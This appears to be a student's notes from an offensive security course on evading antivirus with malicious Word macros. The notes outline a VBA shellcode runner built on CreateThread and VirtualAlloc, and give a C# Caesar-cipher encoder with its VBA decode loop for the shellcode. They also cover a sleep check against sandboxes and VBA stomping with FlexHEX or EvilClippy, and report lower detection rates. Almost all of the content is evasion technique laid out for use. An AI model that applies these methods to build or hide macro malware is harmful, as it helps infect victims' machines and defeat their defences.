# 05.06 VBA Shellcode Evasion Caesar Cipher Sleep VBA Stomping

> Section 6.7 · FlexHEX · EvilClippy · P-code vs CompressedSourceCode

## Overview

Three layered VBA evasion techniques from the textbook: (1) The base VBA shellcode runner, (2) Caesar cipher encryption of the shellcode buf array plus VBA decimal format output, and (3) VBA Stomping — removing the VBA source code while leaving the compiled P-code intact. Word executes P-code when opened on the same Office version it was created on, so the macro still runs. Stomping brings detection from 7/26 down to 4/26.

## Steps

- **Base VBA runner** — CreateThread, VirtualAlloc, RtlMoveMemory via PtrSafe Declare; Document_Open + AutoOpen entry points.
- **VBA Caesar format** — use {0:D} decimal format + newline every 50 bytes for VBA Array() compatibility.
- **VBA Caesar decode** — `For i = 0 To UBound(buf): buf(i) = buf(i) - 2: Next i` before execution.
- **VBA Sleep** — Declare PtrSafe Function Sleep Lib "KERNEL32"; DateDiff("s", t1, t2) < 2 → Exit Function.
- **VBA Stomping** — open .doc in FlexHEX → OLE Compound File → Macro/VBA/NewMacros → select from 'Attribute VB_Name' to end → Insert Zero Block; or use EvilClippy -s fake.vba malicious.doc.
- **P-code vs source** — P-code in PerformanceCache executes if same Office version; CompressedSourceCode (textual VBA) can be zeroed out.

### Caesar cipher for VBA output

```csharp
// Caesar cipher encoder — outputs decimal format for VBA Array() compatibility
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++)
{
  encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}

uint counter = 0;

StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach(byte b in encoded)
{
  hex.AppendFormat("{0:D}, ", b);
  counter++;
  if(counter % 50 == 0)
  {
      hex.AppendFormat("_{0}", Environment.NewLine);
  }
}
Console.WriteLine("The payload is: " + hex.ToString());
```
